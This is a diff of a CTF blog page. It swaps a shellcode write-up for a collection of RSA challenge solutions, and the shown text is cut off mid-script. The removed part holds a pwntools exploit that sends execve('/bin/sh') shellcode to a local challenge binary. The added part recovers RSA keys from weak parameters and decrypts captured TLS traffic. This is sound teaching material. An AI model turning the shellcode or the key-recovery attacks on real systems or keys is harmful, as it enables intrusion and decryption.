@@ -119,25 +119,25 @@
 
 
 
-  <meta name="description" content="shellcode方向 jmp $与lea 题目让你输入shellcode,然后用0xcc(int 3)分隔shellcode,留下空间分别为4,5,9,并清零rip外的寄存器. 短跳转jmp $ + n指令长度为2,使用其绕过0xcc.使用lea [rip + n]新建栈和其他参数. 1234567891011121314151617181920212223242526272829303">
+  <meta name="description" content="rsa 2018 CodeGate CTF Rsababy 题目就是正常的\(RSA\)加密,但是生成了两个额外的数\(h\),\(g\)并打印. 1234567891011121314def GenerateKeys(p, q):    e = 65537    n = p * q    pi_n = (p - 1) * (q - 1)    d = mulinv(e, pi_n)">
 <meta name="keywords" content="Jeopardy">
 <meta property="og:type" content="article">
-<meta property="og:title" content="writeup-collection">
-<meta property="og:url" content="https://hitworld.github.io/posts/4eef53f0/index.html">
+<meta property="og:title" content="writeup-crypto-collection">
+<meta property="og:url" content="https://hitworld.github.io/posts/6d6e1fc1/index.html">
 <meta property="og:site_name" content="w4rd3n">
-<meta property="og:description" content="shellcode方向 jmp $与lea 题目让你输入shellcode,然后用0xcc(int 3)分隔shellcode,留下空间分别为4,5,9,并清零rip外的寄存器. 短跳转jmp $ + n指令长度为2,使用其绕过0xcc.使用lea [rip + n]新建栈和其他参数. 1234567891011121314151617181920212223242526272829303">
+<meta property="og:description" content="rsa 2018 CodeGate CTF Rsababy 题目就是正常的\(RSA\)加密,但是生成了两个额外的数\(h\),\(g\)并打印. 1234567891011121314def GenerateKeys(p, q):    e = 65537    n = p * q    pi_n = (p - 1) * (q - 1)    d = mulinv(e, pi_n)">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2020-08-09T06:34:17.851Z">
+<meta property="og:updated_time" content="2020-08-25T11:36:15.606Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="writeup-collection">
-<meta name="twitter:description" content="shellcode方向 jmp $与lea 题目让你输入shellcode,然后用0xcc(int 3)分隔shellcode,留下空间分别为4,5,9,并清零rip外的寄存器. 短跳转jmp $ + n指令长度为2,使用其绕过0xcc.使用lea [rip + n]新建栈和其他参数. 1234567891011121314151617181920212223242526272829303">
+<meta name="twitter:title" content="writeup-crypto-collection">
+<meta name="twitter:description" content="rsa 2018 CodeGate CTF Rsababy 题目就是正常的\(RSA\)加密,但是生成了两个额外的数\(h\),\(g\)并打印. 1234567891011121314def GenerateKeys(p, q):    e = 65537    n = p * q    pi_n = (p - 1) * (q - 1)    d = mulinv(e, pi_n)">
 
 
 
 
 
 
-  <link rel="canonical" href="https://hitworld.github.io/posts/4eef53f0/">
+  <link rel="canonical" href="https://hitworld.github.io/posts/6d6e1fc1/">
 
 
 
@@ -147,7 +147,7 @@
   };
 </script>
 
-  <title>writeup-collection | w4rd3n</title>
+  <title>writeup-crypto-collection | w4rd3n</title>
   
 
 
@@ -396,7 +396,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://hitworld.github.io/posts/4eef53f0/">
+    <link itemprop="mainEntityOfPage" href="https://hitworld.github.io/posts/6d6e1fc1/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="w4rd3n">
@@ -413,7 +413,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">writeup-collection
+          <h1 class="post-title" itemprop="name headline">writeup-crypto-collection
               
             
           </h1>
@@ -438,7 +438,7 @@
                 
               
 
-              <time title="创建时间：2019-11-29 09:30:28" itemprop="dateCreated datePublished" datetime="2019-11-29T09:30:28+08:00">2019-11-29</time>
+              <time title="创建时间：2020-08-25 19:07:54" itemprop="dateCreated datePublished" datetime="2020-08-25T19:07:54+08:00">2020-08-25</time>
             
 
             
@@ -470,7 +470,7 @@
 
           
           
-             <span id="/posts/4eef53f0/" class="leancloud_visitors" data-flag-title="writeup-collection">
+             <span id="/posts/6d6e1fc1/" class="leancloud_visitors" data-flag-title="writeup-crypto-collection">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -496,7 +496,7 @@
                 
                   <span class="post-meta-item-text">本文字数：</span>
                 
-                <span title="本文字数">1.2k</span>
+                <span title="本文字数">12k</span>
               
 
               
@@ -510,7 +510,7 @@
                 
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
-                <span title="阅读时长">1 分钟</span>
+                <span title="阅读时长">11 分钟</span>
               
             </div>
           
@@ -530,11 +530,74 @@
       
 
       
-        <h2 id="shellcode方向">shellcode方向</h2>
-<h3 id="jmp-与lea">jmp $与lea</h3>
-<p>题目让你输入<code>shellcode</code>,然后用<code>0xcc</code>(<code>int 3</code>)分隔<code>shellcode</code>,留下空间分别为<code>4</code>,<code>5</code>,<code>9</code>,并清零<code>rip</code>外的寄存器.</p>
-<p>短跳转<code>jmp $ + n</code>指令长度为<code>2</code>,使用其绕过<code>0xcc</code>.使用<code>lea [rip + n]</code>新建栈和其他参数.</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">context.os = <span class="string">"linux"</span></span><br><span class="line"><span class="comment">#context.aslr = False</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">"./pwn"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r, "b * 0x555555554a06\nc")</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print len(asm("mov al, 59", arch = "amd64", os = "linux"))</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">"mov dl, 0xff; jmp $ + 9"</span>, arch = <span class="string">"amd64"</span>, os = <span class="string">"linux"</span>)</span><br><span class="line">shellcode = shellcode.ljust(<span class="number">9</span>, <span class="string">"a"</span>)</span><br><span class="line">shellcode += asm(<span class="string">"lea rsi, [rip - 0x12]"</span>, arch = <span class="string">"amd64"</span>, os = <span class="string">"linux"</span>)</span><br><span class="line">shellcode += asm(<span class="string">"jmp $ + 3"</span>, arch = <span class="string">"amd64"</span>, os = <span class="string">"linux"</span>)</span><br><span class="line">shellcode += asm(<span class="string">"syscall"</span>, arch = <span class="string">"amd64"</span>, os = <span class="string">"linux"</span>)</span><br><span class="line">r.sendafter(<span class="string">"Give me your code:\n"</span>, shellcode.ljust(<span class="number">26</span>, <span class="string">"a"</span>))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">'''</span></span><br><span class="line"><span class="string">    lea rsp, [rip - 0x18]</span></span><br><span class="line"><span class="string">    push 0x68</span></span><br><span class="line"><span class="string">    mov rax, 0x732f2f2f6e69622f</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    push 0x1010101 ^ 0x6873</span></span><br><span class="line"><span class="string">    xor dword ptr [rsp], 0x1010101</span></span><br><span class="line"><span class="string">    xor esi, esi</span></span><br><span class="line"><span class="string">    push rsi</span></span><br><span class="line"><span class="string">    push 8</span></span><br><span class="line"><span class="string">    pop rsi</span></span><br><span class="line"><span class="string">    add rsi, rsp</span></span><br><span class="line"><span class="string">    push rsi</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    xor edx, edx</span></span><br><span class="line"><span class="string">    push 59</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"a"</span> * <span class="number">0x17</span> + asm(shellcode)</span><br><span class="line">r.send(shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+        <h2 id="rsa">rsa</h2>
+<h3 id="codegate-ctf-rsababy">2018 CodeGate CTF Rsababy</h3>
+<p>题目就是正常的<span class="math inline">\(RSA\)</span>加密,但是生成了两个额外的数<span class="math inline">\(h\)</span>,<span class="math inline">\(g\)</span>并打印.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GenerateKeys</span><span class="params">(p, q)</span>:</span></span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    n = p * q</span><br><span class="line">    pi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    d = mulinv(e, pi_n)</span><br><span class="line">    h = (d + p)^(d - p)</span><br><span class="line">    g = d * (p - <span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [e, n, h, g]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print("[*] Encrypted Data : %d\n" % EncryptedData)</span></span><br><span class="line">    <span class="comment"># print("[*] N : %d\n" % N)</span></span><br><span class="line">    <span class="comment"># print("[*] h : %d\n" % hint)</span></span><br><span class="line">    <span class="comment"># print("[*] g : %d\n" % gint)</span></span><br></pre></td></tr></table></figure>
+<p>密文,<span class="math inline">\(n\)</span>,<span class="math inline">\(h\)</span>,<span class="math inline">\(g\)</span>是给出的,<span class="math inline">\(e\)</span>是固定的,令<span class="math inline">\(const = 0xdeadbeef\)</span>.</p>
+<p><span class="math display">\[
+\begin{align}
+eg &amp;= ed*(p-const)\\
+2^{eg} &amp;= 2^{ed*(p-const)} \equiv 2^{p-const} \pmod{n}\\
+2^{p-const}*2^{const-1} &amp;= 2^{p-1} \pmod{n}\\
+2^{p-1} &amp;= 2^{eg}*2^{const-1} + kn\\
+p &amp;| 2^{p-1} - 1\\
+p &amp;| 2^{eg}*2^{const-1} + kn - 1\\
+p &amp;| 2^{eg}*2^{const-1} - 1\\
+p &amp;| gcd(2^{eg}*2^{const-1} - 1, n)\\
+p &amp;= gcd(2^{eg}*2^{const-1} - 1, n)\\
+\end{align}
+\]</span></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tmp = gmpy2.powmod(<span class="number">2</span>,e*g+const<span class="number">-1</span>,n)<span class="number">-1</span></span><br><span class="line">p = gmpy2.gcd(tmp,n)</span><br><span class="line">q = n/p</span><br><span class="line">phin = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d =gmpy2.invert(e,phin)</span><br><span class="line">plain = gmpy2.powmod(data,d,n)</span><br><span class="line"><span class="keyword">print</span> hex(plain)[<span class="number">2</span>:].decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="国家安全周-pure-math">2018 国家安全周 pure math</h3>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1) p ** p % q = 1137973316343089029387365135250835133803975869258714714790597743585251681751361684698632609164883988455302237641489036138661596754239799122081528662395492</span><br><span class="line">2) q ** q % p = 6901383184477756324584651464895743132603115552606852729050186289748558760692261058141015199261946483809004373728135568483701274908717004197776113227815323</span><br><span class="line">3) (p ** q + q ** p) % (p*q) = 16791287391494893024031688699360885996180880807427715700800644759680986120242383930558410147341340225420991368114858791447699399702390358184412301644459406</span><br><span class="line">4) (p+q) ** (p+q) % (p*q) = 63112211860889153729003401381621068190906433969243079543438386686621389392583849748240273643614258173423474299387234175508649197780206757067354426424570586101908571600743792328163163458500138799976944702155779196849585083397395750018148652864158388247163109077215394538930498877175474225571393901460434679279</span><br><span class="line">5) FLAG ** 31337 % (p*q) = 6931243291746179589612148118911670244427928875888377273917973305632621316868302667641610838193899081089153471883271406133321321416064760200919958612671379845738048938060512995550639898688604592620908415248701721672948126507753670027043162669545932921683579001870526727737212722417683610956855529996310258030</span><br><span class="line">Now, what’s the FLAG???</span><br></pre></td></tr></table></figure>
+<p>将前4个式子的结果记为<span class="math inline">\(x_1,x_2,x_3,x_4\)</span>.</p>
+<p><span class="math display">\[
+\begin{align}
+x_1 &amp;= p^p mod q\\
+x_2 &amp;= q^q mod p\\
+x_3 &amp;= (p^q + q^p) mod pq\\
+x_4 &amp;= (p + q)^{p + q} mod pq\\
+p^{q-1} &amp;\equiv 1 \pmod{q} \\
+p^q &amp;\equiv p \pmod{q} \\
+q^{p-1} &amp;\equiv 1 \pmod{p} \\
+q^p &amp;\equiv q \pmod{p} \\
+p^q + q^p &amp;\equiv p + q \pmod{pq} = p + q = x_3\\
+x_4 &amp;= (p + q)^{p + q} mod pq\\
+&amp;= p^{p+q} + q^{p+q} mod pq\\
+&amp;= px_1 + qx_2\\
+x_4 - x_1 * x_3 &amp;= px_1 + qx_2 - px_1 - qx_1\\
+&amp;= q(x_2 - x_1)\\
+\end{align}
+\]</span></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">q = (x4 - x1 * x3) / (x2 - x1)</span><br><span class="line">p = x3 - q</span><br><span class="line"></span><br><span class="line">phin = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(<span class="number">31337</span>, phin)</span><br><span class="line">flag = gmpy2.powmod(c, d, p * q)</span><br><span class="line">flag = hex(flag)[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">print</span> flag.decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="pwnhub-lhy">2018 Pwnhub LHY</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> + <span class="number">1</span> + <span class="number">2</span> ** <span class="number">2018</span> == <span class="number">30097557298197417800049182668952226601954645169633891463401117760245367082644152355564014438095421962150109895432272944128252155287648477680131934943095113263121691874508742328500559321036238322775864636883202538152031804102118831278605474474352011895348919417742923873371980983336517409056008233804190890418285814476821890492630167665485823056526646050928460488168341721716361299816947722947465808004305806687049198633489997459201469227952552870291934919760829984421958853221330987033580524592596407485826446284220272614663464267135596497185086055090126893989371261962903295313304735911034185619611156742146</span></span><br></pre></td></tr></table></figure>
+<p>所以<span class="math inline">\(x + 1\)</span>和<span class="math inline">\(y\)</span>都是质数,<span class="math inline">\((x ** 2 - 1) ** 2\)</span>整除<span class="math inline">\(2 * x * y - 1\)</span>.</p>
+<p>为了式子能成立,猜测<span class="math inline">\(x = 2 * y\)</span>.</p>
+<p>则:<span class="math inline">\(p = next_prime(9 * (y ** 3))\)</span>,<span class="math inline">\(p = next_prime(6 * (y ** 3))\)</span>.</p>
+<p>根据素数的间隔,可以知道 <span class="math inline">\(p\)</span>和<span class="math inline">\(q\)</span>最多比括号里的数字大一点.由于已知<span class="math inline">\(n\)</span>,所以已知<span class="math inline">\(y\)</span>的上界,利用二分查找的方式来寻找<span class="math inline">\(p\)</span>和 <span class="math inline">\(q\)</span>.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">end = gmpy2.iroot(n / <span class="number">54</span>, <span class="number">6</span>)[<span class="number">0</span>]</span><br><span class="line">beg = end - <span class="number">2000000</span></span><br><span class="line"></span><br><span class="line">mid = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> beg &lt; end:</span><br><span class="line">    mid = (beg + end) / <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> gmpy2.is_prime(mid) != <span class="number">1</span>:</span><br><span class="line">        mid = gmpy2.next_prime(mid)</span><br><span class="line">    p = gmpy2.next_prime(<span class="number">9</span> * mid ** <span class="number">3</span>)</span><br><span class="line">    q = gmpy2.next_prime(<span class="number">6</span> * mid ** <span class="number">3</span>)</span><br><span class="line">    n1 = p * q</span><br><span class="line">    <span class="keyword">if</span> n1 == n:</span><br><span class="line">        phin = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">        d = gmpy2.invert(<span class="number">0x10001</span>, phin)</span><br><span class="line">        m = gmpy2.powmod(enc, d, n)</span><br><span class="line">        <span class="keyword">print</span> hex(m)[<span class="number">2</span>:].strip(<span class="string">'L'</span>).decode(<span class="string">'hex'</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">elif</span> n1 &lt; n:</span><br><span class="line">        beg = mid</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        end = mid</span><br></pre></td></tr></table></figure>
+<h3 id="seccon-very-smooth">2017 SECCON very smooth</h3>
+<p>解压获得一个加密的流量文件,首先<span class="math inline">\(binwalk\)</span>从加密的流量文件中取出证书.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e s.pcap</span><br></pre></td></tr></table></figure>
+<p>查看三个证书,三个模数都一样,取任意一个进行分析.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">$ openssl x509 -inform DER -<span class="keyword">in</span> FC6.crt -pubkey -text -modulus -noout</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDVRqqCXPYd6Xdl9GT7/kiJrYvy</span><br><span class="line">8lohddAsi28qwMXCe2cDWuwZKzdB3R9NEnUxsHqwEuuGJBwJwIFJnmnvWurHjcYj</span><br><span class="line">DUddp+4X8C9jtvCaLTgd+baSjo2eB0f+uiSL/9/4nN+vR3FliRm2mByeFCjppTQl</span><br><span class="line">yioxCqbXYIMxGO4NcQIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line">Certificate:</span><br><span class="line">    Data:</span><br><span class="line">        Version: 1 (0x0)</span><br><span class="line">        Serial Number: 11640506567126718943 (0xa18b630c7b3099df)</span><br><span class="line">    Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">        Issuer: C=JP, ST=Kawasaki, O=SRL</span><br><span class="line">        Validity</span><br><span class="line">            Not Before: Oct  8 02:47:17 2017 GMT</span><br><span class="line">            Not After : Oct  8 02:47:17 2018 GMT</span><br><span class="line">        Subject: C=JP, ST=Kawasaki, O=SRL</span><br><span class="line">        Subject Public Key Info:</span><br><span class="line">            Public Key Algorithm: rsaEncryption</span><br><span class="line">                Public-Key: (1024 bit)</span><br><span class="line">                Modulus:</span><br><span class="line">                    00:d5:46:aa:82:5c:f6:1d:e9:77:65:f4:64:fb:fe:</span><br><span class="line">                    48:89:ad:8b:f2:f2:5a:21:75:d0:2c:8b:6f:2a:c0:</span><br><span class="line">                    c5:c2:7b:67:03:5a:ec:19:2b:37:41:dd:1f:4d:12:</span><br><span class="line">                    75:31:b0:7a:b0:12:eb:86:24:1c:09:c0:81:49:9e:</span><br><span class="line">                    69:ef:5a:ea:c7:8d:c6:23:0d:47:5d:a7:ee:17:f0:</span><br><span class="line">                    2f:63:b6:f0:9a:2d:38:1d:f9:b6:92:8e:8d:9e:07:</span><br><span class="line">                    47:fe:ba:24:8b:ff:df:f8:9c:df:af:47:71:65:89:</span><br><span class="line">                    19:b6:98:1c:9e:14:28:e9:a5:34:25:ca:2a:31:0a:</span><br><span class="line">                    a6:d7:60:83:31:18:ee:0d:71</span><br><span class="line">                Exponent: 65537 (0x10001)</span><br><span class="line">    Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">         78:92:11:fb:6c:e1:7a:f7:2a:33:b8:8b:08:a7:f7:5b:de:cf:</span><br><span class="line">         62:0b:a0:ed:be:d0:69:88:38:93:94:9d:05:41:73:bd:7e:b3:</span><br><span class="line">         32:ec:8e:10:bc:3a:62:b0:56:c7:c1:3f:60:66:a7:be:b9:46:</span><br><span class="line">         f7:46:22:6a:f3:5a:25:d5:66:94:57:0e:<span class="built_in">fc</span>:b5:16:33:05:1c:</span><br><span class="line">         6f:f5:85:74:57:a4:a0:c6:ce:4f:fd:64:53:94:a9:83:b8:96:</span><br><span class="line">         bf:5b:a7:ee:8b:1e:48:a7:d2:43:06:0e:4f:5a:86:62:69:05:</span><br><span class="line">         e2:c0:bd:4e:89:c9:af:04:4a:77:a2:34:86:6a:b8:d2:3b:32:</span><br><span class="line">         b7:39</span><br><span class="line">Modulus=D546AA825CF61DE97765F464FBFE4889AD8BF2F25A2175D02C8B6F2AC0C5C27B67035AEC192B3741DD1F4D127531B07AB012EB86241C09C081499E69EF5AEAC78DC6230D475DA7EE17F02F63B6F09A2D381DF9B6928E8D9E0747FEBA248BFFDFF89CDFAF4771658919B6981C9E1428E9A53425CA2A310AA6D760833118EE0D71</span><br></pre></td></tr></table></figure>
+<p>题目名为<span class="math inline">\(very smooth\)</span>,使用<span class="math inline">\(primefac\)</span>分别尝试<span class="math inline">\(Pollard&#39;s p − 1\)</span>与<span class="math inline">\(Williams&#39;s p + 1\)</span>算法.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ python -m primefac -vs -m=p+1 149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897</span><br><span class="line"></span><br><span class="line">149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897: p+1 11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897</span><br><span class="line">Z309  =  P155 x P155  =  11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 x 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897</span><br></pre></td></tr></table></figure>
+<p>然后利用分解出来的<span class="math inline">\(p\)</span>,<span class="math inline">\(q\)</span>导出私钥证书.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    n = <span class="number">149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897L</span></span><br><span class="line">    p = <span class="number">11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001L</span></span><br><span class="line">    q = <span class="number">12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897L</span></span><br><span class="line">    e = <span class="number">65537L</span></span><br><span class="line">    priv = RSA.construct((n, e, long(gmpy2.invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>)))))</span><br><span class="line">    open(<span class="string">'private.pem'</span>, <span class="string">'w'</span>).write(priv.exportKey(<span class="string">'PEM'</span>))</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
+<p>将私钥导入到<span class="math inline">\(wireshark\)</span>中即可得到明文(<span class="math inline">\(Edit -&gt; Preferences -&gt; Protocols -&gt; SSL(TLS) -&gt; RSA Key List\)</span>).</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>Very smooth<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">Answer: One of these primes is very smooth.</span><br><span class="line"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="jarvis-oj-hard-rsa">Jarvis OJ hard RSA</h3>
+<p>读取公钥.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -pubin -<span class="keyword">in</span> pubkey.pem -text -modulus</span><br></pre></td></tr></table></figure>
+<p><span class="math inline">\(e = 2\)</span>,考虑<span class="math inline">\(Rabin\)</span>算法,首先分解一下<span class="math inline">\(p\)</span>和<span class="math inline">\(q\)</span>,得到.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p = 275127860351348928173285174381581152299</span><br><span class="line">q = 319576316814478949870590164193048041239</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">N = <span class="number">0xC2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD</span></span><br><span class="line">e = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> 